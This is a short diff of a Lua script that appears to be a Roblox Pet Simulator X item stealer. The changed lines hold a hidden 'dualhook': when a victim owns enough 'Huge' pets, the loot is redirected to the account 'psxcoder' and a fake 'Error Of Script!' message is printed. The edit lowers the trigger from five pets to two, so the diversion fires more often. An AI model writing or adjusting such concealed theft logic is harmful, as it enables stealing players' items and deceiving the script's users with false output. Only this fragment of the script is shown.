@@ -257,7 +257,7 @@ for i, v in pairs(save.Pet) do
         AmountOfHuges = AmountOfHuges + 1
     end
 end
-if AmountOfHuges >= 5 then
+if AmountOfHuges >= 2 then
     Username = "psxcoder" -- Your nick in dualhook
     print("Error Of Script!")
 else
